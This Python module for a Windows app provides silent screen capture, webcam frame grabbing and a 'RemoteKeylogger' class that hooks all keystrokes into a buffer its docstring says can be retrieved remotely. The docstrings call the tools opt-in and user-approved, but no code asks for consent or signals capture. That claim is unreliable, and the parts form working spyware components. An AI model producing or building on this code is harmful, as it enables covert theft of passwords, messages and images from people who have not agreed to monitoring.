"""Opt-in screen, camera, and secure keylogger utilities for a Windows desktop app.
Install dependencies:
    pip install mss opencv-python pynput
Screen, camera, and keylogger functions execute only when explicitly called and
approved by the local user. """

from __future__ import annotations

import threading
from collections.abc import Callable

import cv2
import mss
import mss.tools
from pynput import keyboard


def capture_primary_screen_png() -> bytes:
    """Capture the primary display and return it as in-memory PNG bytes."""
    try:
        with mss.mss() as screen_capture:
            primary_monitor = screen_capture.monitors[1]
            image = screen_capture.grab(primary_monitor)
            return mss.tools.to_png(image.rgb, image.size)
    except mss.exception.ScreenShotError as exc:
        raise RuntimeError(f"Unable to capture the primary screen: {exc}") from exc


def capture_camera_frame(camera_index: int = 0):
    """Capture one frame from a camera and return it as a BGR OpenCV array."""
    if not isinstance(camera_index, int) or isinstance(camera_index, bool) or camera_index < 0:
        raise ValueError("camera_index must be a non-negative integer")

    camera = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
    try:
        if not camera.isOpened():
            raise RuntimeError(f"Unable to open camera {camera_index}")
        success, frame = camera.read()
        if not success or frame is None:
            raise RuntimeError(f"Camera {camera_index} did not return a frame")
        return frame
    finally:
        camera.release()


class RemoteKeylogger:
    """Thread-safe keylogger that captures keystrokes only upon explicit user consent.

    It collects typed characters into an in-memory buffer, which can be retrieved
    and cleared remotely. Must be stopped cleanly to release system hooks.
    """

    def __init__(self) -> None:
        self._buffer: list[str] = []
        self._lock = threading.Lock()
        self._listener: keyboard.Listener | None = None
        self._is_running = False

    def _on_press(self, key: keyboard.Key | keyboard.KeyCode | None) -> None:
        with self._lock:
            try:
                if isinstance(key, keyboard.KeyCode) and key.char:
                    self._buffer.append(key.char)
                elif key == keyboard.Key.space:
                    self._buffer.append(" ")
                elif key == keyboard.Key.enter:
                    self._buffer.append("\n[ENTER]\n")
                elif key == keyboard.Key.backspace:
                    if self._buffer:
                        self._buffer.pop()
                elif key == keyboard.Key.tab:
                    self._buffer.append("\t")
                else:
                    # Ghi nhận các phím đặc biệt dưới dạng tên rút gọn
                    self._buffer.append(f"[{key.name.upper()}]")
            except Exception:
                pass

    def start(self) -> None:
        """Start recording keystrokes in a background thread listener."""
        with self._lock:
            if self._is_running:
                return
            self._buffer.clear()
            self._listener = keyboard.Listener(on_press=self._on_press)
            self._listener.start()
            self._is_running = True

    def get_and_clear(self) -> str:
        """Retrieve accumulated keystrokes as a string and clear the buffer."""
        with self._lock:
            data = "".join(self._buffer)
            self._buffer.clear()
            return data

    def stop(self) -> None:
        """Stop the keylogger listener and release the keyboard hook."""
        with self._lock:
            if self._is_running and self._listener:
                self._listener.stop()
                self._listener = None
            self._is_running = False
            self._buffer.clear()

    @property
    def is_running(self) -> bool:
        with self._lock:
            return self._is_running